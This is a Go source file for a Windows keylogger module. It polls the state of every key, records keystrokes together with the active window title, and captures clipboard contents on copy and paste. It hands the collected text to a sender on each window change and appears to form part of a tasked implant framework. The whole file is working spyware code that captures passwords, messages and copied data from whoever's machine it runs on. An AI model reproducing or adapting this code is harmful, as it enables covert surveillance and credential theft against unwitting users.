// +build windows

package keystate

import (
	"fmt"
	"log"
	"syscall"
	"time"
	"unsafe"

	"keylog/clipboard"
)

// Virtual-Key Codes
const (
	SHIFT_KEY              = uint32(16)
	CONTROL_KEY            = uint32(131072)
	VK_LBUTTON             = 0x01
	VK_RBUTTON             = 0x02
	VK_CANCEL              = 0x03
	VK_MBUTTON             = 0x04
	VK_XBUTTON1            = 0x05
	VK_XBUTTON2            = 0x06
	VK_BACK                = 0x08
	VK_TAB                 = 0x09
	VK_CLEAR               = 0x0C
	VK_RETURN              = 0x0D
	VK_SHIFT               = 0x10
	VK_CONTROL             = 0x11
	VK_MENU                = 0x12
	VK_PAUSE               = 0x13
	VK_CAPITAL             = 0x14
	VK_KANA                = 0x15
	VK_HANGEUL             = 0x15
	VK_HANGUL              = 0x15
	VK_JUNJA               = 0x17
	VK_FINAL               = 0x18
	VK_HANJA               = 0x19
	VK_KANJI               = 0x19
	VK_ESCAPE              = 0x1B
	VK_CONVERT             = 0x1C
	VK_NONCONVERT          = 0x1D
	VK_ACCEPT              = 0x1E
	VK_MODECHANGE          = 0x1F
	VK_SPACE               = 0x20
	VK_PRIOR               = 0x21
	VK_NEXT                = 0x22
	VK_END                 = 0x23
	VK_HOME                = 0x24
	VK_LEFT                = 0x25
	VK_UP                  = 0x26
	VK_RIGHT               = 0x27
	VK_DOWN                = 0x28
	VK_SELECT              = 0x29
	VK_PRINT               = 0x2A
	VK_EXECUTE             = 0x2B
	VK_SNAPSHOT            = 0x2C
	VK_INSERT              = 0x2D
	VK_DELETE              = 0x2E
	VK_HELP                = 0x2F
	VK_LWIN                = 0x5B
	VK_RWIN                = 0x5C
	VK_APPS                = 0x5D
	VK_SLEEP               = 0x5F
	VK_NUMPAD0             = 0x60
	VK_NUMPAD1             = 0x61
	VK_NUMPAD2             = 0x62
	VK_NUMPAD3             = 0x63
	VK_NUMPAD4             = 0x64
	VK_NUMPAD5             = 0x65
	VK_NUMPAD6             = 0x66
	VK_NUMPAD7             = 0x67
	VK_NUMPAD8             = 0x68
	VK_NUMPAD9             = 0x69
	VK_MULTIPLY            = 0x6A
	VK_ADD                 = 0x6B
	VK_SEPARATOR           = 0x6C
	VK_SUBTRACT            = 0x6D
	VK_DECIMAL             = 0x6E
	VK_DIVIDE              = 0x6F
	VK_F1                  = 0x70
	VK_F2                  = 0x71
	VK_F3                  = 0x72
	VK_F4                  = 0x73
	VK_F5                  = 0x74
	VK_F6                  = 0x75
	VK_F7                  = 0x76
	VK_F8                  = 0x77
	VK_F9                  = 0x78
	VK_F10                 = 0x79
	VK_F11                 = 0x7A
	VK_F12                 = 0x7B
	VK_F13                 = 0x7C
	VK_F14                 = 0x7D
	VK_F15                 = 0x7E
	VK_F16                 = 0x7F
	VK_F17                 = 0x80
	VK_F18                 = 0x81
	VK_F19                 = 0x82
	VK_F20                 = 0x83
	VK_F21                 = 0x84
	VK_F22                 = 0x85
	VK_F23                 = 0x86
	VK_F24                 = 0x87
	VK_NUMLOCK             = 0x90
	VK_SCROLL              = 0x91
	VK_OEM_NEC_EQUAL       = 0x92
	VK_OEM_FJ_JISHO        = 0x92
	VK_OEM_FJ_MASSHOU      = 0x93
	VK_OEM_FJ_TOUROKU      = 0x94
	VK_OEM_FJ_LOYA         = 0x95
	VK_OEM_FJ_ROYA         = 0x96
	VK_LSHIFT              = 0xA0
	VK_RSHIFT              = 0xA1
	VK_LCONTROL            = 0xA2
	VK_RCONTROL            = 0xA3
	VK_LMENU               = 0xA4
	VK_RMENU               = 0xA5
	VK_BROWSER_BACK        = 0xA6
	VK_BROWSER_FORWARD     = 0xA7
	VK_BROWSER_REFRESH     = 0xA8
	VK_BROWSER_STOP        = 0xA9
	VK_BROWSER_SEARCH      = 0xAA
	VK_BROWSER_FAVORITES   = 0xAB
	VK_BROWSER_HOME        = 0xAC
	VK_VOLUME_MUTE         = 0xAD
	VK_VOLUME_DOWN         = 0xAE
	VK_VOLUME_UP           = 0xAF
	VK_MEDIA_NEXT_TRACK    = 0xB0
	VK_MEDIA_PREV_TRACK    = 0xB1
	VK_MEDIA_STOP          = 0xB2
	VK_MEDIA_PLAY_PAUSE    = 0xB3
	VK_LAUNCH_MAIL         = 0xB4
	VK_LAUNCH_MEDIA_SELECT = 0xB5
	VK_LAUNCH_APP1         = 0xB6
	VK_LAUNCH_APP2         = 0xB7
	VK_OEM_1               = 0xBA
	VK_OEM_PLUS            = 0xBB
	VK_OEM_COMMA           = 0xBC
	VK_OEM_MINUS           = 0xBD
	VK_OEM_PERIOD          = 0xBE
	VK_OEM_2               = 0xBF
	VK_OEM_3               = 0xC0
	VK_OEM_4               = 0xDB
	VK_OEM_5               = 0xDC
	VK_OEM_6               = 0xDD
	VK_OEM_7               = 0xDE
	VK_OEM_8               = 0xDF
	VK_OEM_AX              = 0xE1
	VK_OEM_102             = 0xE2
	VK_ICO_HELP            = 0xE3
	VK_ICO_00              = 0xE4
	VK_PROCESSKEY          = 0xE5
	VK_ICO_CLEAR           = 0xE6
	VK_PACKET              = 0xE7
	VK_OEM_RESET           = 0xE9
	VK_OEM_JUMP            = 0xEA
	VK_OEM_PA1             = 0xEB
	VK_OEM_PA2             = 0xEC
	VK_OEM_PA3             = 0xED
	VK_OEM_WSCTRL          = 0xEE
	VK_OEM_CUSEL           = 0xEF
	VK_OEM_ATTN            = 0xF0
	VK_OEM_FINISH          = 0xF1
	VK_OEM_COPY            = 0xF2
	VK_OEM_AUTO            = 0xF3
	VK_OEM_ENLW            = 0xF4
	VK_OEM_BACKTAB         = 0xF5
	VK_ATTN                = 0xF6
	VK_CRSEL               = 0xF7
	VK_EXSEL               = 0xF8
	VK_EREOF               = 0xF9
	VK_PLAY                = 0xFA
	VK_ZOOM                = 0xFB
	VK_NONAME              = 0xFC
	VK_PA1                 = 0xFD
	VK_OEM_CLEAR           = 0xFE
)

var (
	user32                  = syscall.MustLoadDLL("user32.dll")
	procGetAsyncKeyState    = user32.MustFindProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.MustFindProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW      = user32.MustFindProc("GetWindowTextW")      //GetWindowTextW

	// Maps key codes to strings
	keyMap = map[int]string{
		VK_CONTROL:    "[Ctrl]",
		VK_BACK:       "[Back]",
		VK_TAB:        "[Tab]",
		VK_RETURN:     "[Enter]\n",
		VK_SHIFT:      "[Shift]",
		VK_MENU:       "[Alt]",
		VK_CAPITAL:    "[CapsLock]",
		VK_ESCAPE:     "[Esc]",
		VK_SPACE:      " ",
		VK_PRIOR:      "[PageUp]",
		VK_NEXT:       "[PageDown]",
		VK_END:        "[End]",
		VK_HOME:       "[Home]",
		VK_LEFT:       "[Left]",
		VK_UP:         "[Up]",
		VK_RIGHT:      "[Right]",
		VK_DOWN:       "[Down]",
		VK_SELECT:     "[Select]",
		VK_PRINT:      "[Print]",
		VK_EXECUTE:    "[Execute]",
		VK_SNAPSHOT:   "[PrintScreen]",
		VK_INSERT:     "[Insert]",
		VK_DELETE:     "[Delete]",
		VK_HELP:       "[Help]",
		VK_LWIN:       "[LeftWindows]",
		VK_RWIN:       "[RightWindows]",
		VK_APPS:       "[Applications]",
		VK_SLEEP:      "[Sleep]",
		VK_NUMPAD0:    "[Pad 0]",
		VK_NUMPAD1:    "[Pad 1]",
		VK_NUMPAD2:    "[Pad 2]",
		VK_NUMPAD3:    "[Pad 3]",
		VK_NUMPAD4:    "[Pad 4]",
		VK_NUMPAD5:    "[Pad 5]",
		VK_NUMPAD6:    "[Pad 6]",
		VK_NUMPAD7:    "[Pad 7]",
		VK_NUMPAD8:    "[Pad 8]",
		VK_NUMPAD9:    "[Pad 9]",
		VK_MULTIPLY:   "*",
		VK_ADD:        "+",
		VK_SEPARATOR:  "[Separator]",
		VK_SUBTRACT:   "-",
		VK_OEM_PLUS:   "=",
		VK_OEM_MINUS:  "-",
		VK_DECIMAL:    ".",
		VK_DIVIDE:     "[Divide]",
		VK_F1:         "[F1]",
		VK_F2:         "[F2]",
		VK_F3:         "[F3]",
		VK_F4:         "[F4]",
		VK_F5:         "[F5]",
		VK_F6:         "[F6]",
		VK_F7:         "[F7]",
		VK_F8:         "[F8]",
		VK_F9:         "[F9]",
		VK_F10:        "[F10]",
		VK_F11:        "[F11]",
		VK_F12:        "[F12]",
		VK_NUMLOCK:    "[NumLock]",
		VK_SCROLL:     "[ScrollLock]",
		VK_LSHIFT:     "[LeftShift]",
		VK_RSHIFT:     "[RightShift]",
		VK_LCONTROL:   "[LeftCtrl]",
		VK_RCONTROL:   "[RightCtrl]",
		VK_LMENU:      "[LeftMenu]",
		VK_RMENU:      "[RightMenu]",
		VK_OEM_1:      ";",
		VK_OEM_2:      "/",
		VK_OEM_3:      "`",
		VK_OEM_4:      "[",
		VK_OEM_5:      "\\",
		VK_OEM_6:      "]",
		VK_OEM_7:      "'",
		VK_OEM_PERIOD: ".",
		0x30:          "0",
		0x31:          "1",
		0x32:          "2",
		0x33:          "3",
		0x34:          "4",
		0x35:          "5",
		0x36:          "6",
		0x37:          "7",
		0x38:          "8",
		0x39:          "9",
		0x41:          "a",
		0x42:          "b",
		0x43:          "c",
		0x44:          "d",
		0x45:          "e",
		0x46:          "f",
		0x47:          "g",
		0x48:          "h",
		0x49:          "i",
		0x4A:          "j",
		0x4B:          "k",
		0x4C:          "l",
		0x4D:          "m",
		0x4E:          "n",
		0x4F:          "o",
		0x50:          "p",
		0x51:          "q",
		0x52:          "r",
		0x53:          "s",
		0x54:          "t",
		0x55:          "u",
		0x56:          "v",
		0x57:          "w",
		0x58:          "x",
		0x59:          "y",
		0x5A:          "z",
	}
)

//Get Active Window Title
func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	for {
		if *curTask.Job.Stop > 0 {
			break
		}
		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		_, err := getWindowText(g, &b[0], int32(len(b)))
		if err != nil {
		}
		title := syscall.UTF16ToString(b)
		if title != "" {
			if ksmonitor.WindowTitle != title {
				ksmonitor.mtx.Lock()
				ksmonitor.SendMessage()
				log.Printf("[%s]\n", ksmonitor.WindowTitle)
				log.Println(ksmonitor.Keystrokes)
				ksmonitor.Keystrokes = ""
				ksmonitor.WindowTitle = syscall.UTF16ToString(b)
				ksmonitor.mtx.Unlock()
			}
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func keystateMonitor() {
	for {
		if *curTask.Job.Stop > 0 {
			break
		}
		time.Sleep(1 * time.Millisecond)
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			log.Println(int(Val))
			intVal := int(Val)
			if intVal == 32769 {
				// log.Println(KEY)
				val, ok := keyMap[KEY]
				if ok {
					shift := false
					control := false
					shiftState, _, _ := procGetAsyncKeyState.Call(uintptr(SHIFT_KEY))
					if (uint16(shiftState) & 0x8000) == 0x8000 {
						// log.Println("Shifted", val)
						shift = true
					}
					ctrlState, _, _ := procGetAsyncKeyState.Call(uintptr(VK_CONTROL))
					if (uint16(ctrlState) & 0x8000) == 0x8000 {
						control = true
					}
					ksmonitor.mtx.Lock()
					if control && val == "c" {
						// Copy
						clipboardContents, err := clipboard.ReadAll()
						if err != nil {
							ksmonitor.Keystrokes += val
							// ksmonitor.Keystrokes += val
						} else {
							ksmonitor.Keystrokes += fmt.Sprintf("[COPY]%s[/COPY]", clipboardContents)
						}
						// This is caught by clipboard monitor
						// continue
					} else if control && val == "v" {
						// if control && val == "v" {
						clipboardContents, err := clipboard.ReadAll()
						if err != nil {
							ksmonitor.Keystrokes += val
						} else {
							ksmonitor.Keystrokes += fmt.Sprintf("[PASTE]%s[/PASTE]", clipboardContents)
						}
					} else if control && val == "a" {
						ksmonitor.Keystrokes += "[SELECT ALL]"
					} else if KEY >= 0x30 && KEY <= 0x5A && shift {
						valStr, _ := shiftMap[val]
						// log.Println("GOT VAL:", valStr)
						ksmonitor.Keystrokes += valStr
					} else if shift && (KEY == VK_OEM_1 || KEY == VK_OEM_2 || KEY == VK_OEM_3 || KEY == VK_OEM_4 || KEY == VK_OEM_5 || KEY == VK_OEM_6 || KEY == VK_OEM_7 || KEY == VK_OEM_PERIOD || KEY == VK_OEM_MINUS || KEY == VK_OEM_PLUS) {
						valStr, _ := shiftMap[val]
						// log.Println("GOT VAL:", valStr)
						ksmonitor.Keystrokes += valStr
					} else {
						if !(shift && (KEY == VK_SHIFT || KEY == VK_LSHIFT || KEY == VK_RSHIFT)) && !(control && (KEY == VK_CONTROL || KEY == VK_LCONTROL || KEY == VK_RCONTROL)) {
							if control {
								ksmonitor.Keystrokes += "[Ctrl]"
							} else if shift {
								ksmonitor.Keystrokes += "[Shift]"
							}
							ksmonitor.Keystrokes += val
						}
					}
					ksmonitor.mtx.Unlock()
				}
			}
		}
	}
}

func keyLogger() error {
	// Because we want to flush the buffer on each window change
	// the windowLogger needs to know the channel to send messages to.
	go curTask.Job.MonitorStop()
	go windowLogger()
	go keystateMonitor()
	return nil
}
